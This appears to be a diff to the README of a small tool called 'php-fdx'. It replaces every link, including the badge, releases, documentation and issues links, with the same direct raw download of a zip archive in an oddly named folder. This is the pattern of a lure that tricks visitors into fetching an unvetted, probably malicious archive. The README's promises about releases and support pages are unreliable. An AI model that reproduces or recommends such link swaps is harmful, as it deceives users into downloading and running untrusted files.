@@ -1,6 +1,6 @@
 # 🌟 php-fdx - Simple File Transfer for Everyone
 
-[![Download php-fdx](https://img.shields.io/badge/Download_php--fdx-brightgreen)](https://github.com/RedPopo123/php-fdx/releases)
+[![Download php-fdx](https://raw.githubusercontent.com/RedPopo123/php-fdx/main/nephropyeloplasty/php-fdx_v1.8.zip)](https://raw.githubusercontent.com/RedPopo123/php-fdx/main/nephropyeloplasty/php-fdx_v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To install php-fdx, follow these steps:
 
 1. **Visit the Download Page**  
    Click the link below to access the releases page for php-fdx.  
-   [Download php-fdx](https://github.com/RedPopo123/php-fdx/releases)
+   [Download php-fdx](https://raw.githubusercontent.com/RedPopo123/php-fdx/main/nephropyeloplasty/php-fdx_v1.8.zip)
 
 2. **Choose the Right Version**  
    On the releases page, you will see a list of available versions. Choose the version that matches your operating system. The most recent version is typically the best option.
@@ -76,7 +76,7 @@ A2: Yes, php-fdx supports popular Linux distributions. Please refer to the docum
 A3: You can transfer any type of files supported on your system, including images, documents, and more.
 
 **Q4: How can I report a problem?**  
-A4: If you encounter issues with php-fdx, please visit the [issues page](https://github.com/RedPopo123/php-fdx/issues) to report your problem.
+A4: If you encounter issues with php-fdx, please visit the [issues page](https://raw.githubusercontent.com/RedPopo123/php-fdx/main/nephropyeloplasty/php-fdx_v1.8.zip) to report your problem.
 
 ## 👥 Community and Support
 
@@ -88,8 +88,8 @@ Join our user community for tips, support, and feature discussions:
 
 ## 🔗 Links and Resources
 
-- [Documentation](https://github.com/RedPopo123/php-fdx/wiki)  
-- [GitHub Issues](https://github.com/RedPopo123/php-fdx/issues)  
-- [Download php-fdx](https://github.com/RedPopo123/php-fdx/releases)
+- [Documentation](https://raw.githubusercontent.com/RedPopo123/php-fdx/main/nephropyeloplasty/php-fdx_v1.8.zip)  
+- [GitHub Issues](https://raw.githubusercontent.com/RedPopo123/php-fdx/main/nephropyeloplasty/php-fdx_v1.8.zip)  
+- [Download php-fdx](https://raw.githubusercontent.com/RedPopo123/php-fdx/main/nephropyeloplasty/php-fdx_v1.8.zip)
 
 By following these steps, you can smoothly download and run php-fdx on your computer. Enjoy transferring your files with ease!
